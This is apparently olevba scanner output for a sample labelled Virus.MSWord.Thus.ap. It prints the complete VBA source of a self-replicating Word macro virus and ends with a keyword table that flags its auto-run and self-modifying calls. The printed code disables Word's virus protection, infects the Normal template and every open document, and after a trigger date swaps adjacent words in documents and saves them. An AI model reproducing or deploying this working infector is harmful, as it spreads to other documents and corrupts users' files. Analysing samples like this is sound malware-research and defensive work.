olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: ./Virus.MSWord.Thus.ap
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: ./Virus.MSWord.Thus.ap - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Private Sub Document_Open()
'Replacer'
On Error Resume Next
Application.Options.VirusProtection = False
If NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.Lines(2, 1) <> "'Replacer'" Or _
   NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.CountOfLines = 0 Then
  NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.DeleteLines _
    1, NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.CountOfLines
  NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.InsertLines 1, _
    ActiveDocument.VBProject.VBComponents.Item(1).CodeModule.Lines(1, _
      ActiveDocument.VBProject.VBComponents.Item(1).CodeModule.CountOfLines)
  NormalTemplate.Save
End If
For i = 1 To Application.Documents.Count
  If Application.Documents.Item(i).VBProject.VBComponents.Item(1).CodeModule.Lines(2, 1) <> "'Replacer'" Or _
     Application.Documents.Item(i).VBProject.VBComponents.Item(1).CodeModule.CountOfLines = 0 Then
    Application.Documents.Item(i).VBProject.VBComponents.Item(1).CodeModule.DeleteLines _
      1, Application.Documents.Item(i).VBProject.VBComponents.Item(1).CodeModule.CountOfLines
    Application.Documents.Item(i).VBProject.VBComponents.Item(1).CodeModule.InsertLines 1, _
      NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.Lines(1, _
        NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.CountOfLines)
  End If
Next i
End Sub
Private Sub Document_Close()
Document_Open
On Error Resume Next
If Date > "13.9.2000" And Hour(Now()) = 13 Then
  With ActiveDocument.Words
    For i = 1 To .Count Step 2
      wd = .Item(i)
      .Item(i) = .Item(i + 1)
      .Item(i + 1) = wd
    Next i
  End With
  ActiveDocument.Save
End If
End Sub
Private Sub Document_New()
Document_Open
End Sub












+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |Document_Close      |Runs when the Word document is closed        |
|AutoExec  |Document_New        |Runs when a new Word document is created     |
|AutoExec  |Document_Open       |Runs when the Word or Publisher document is  |
|          |                    |opened                                       |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
+----------+--------------------+---------------------------------------------+

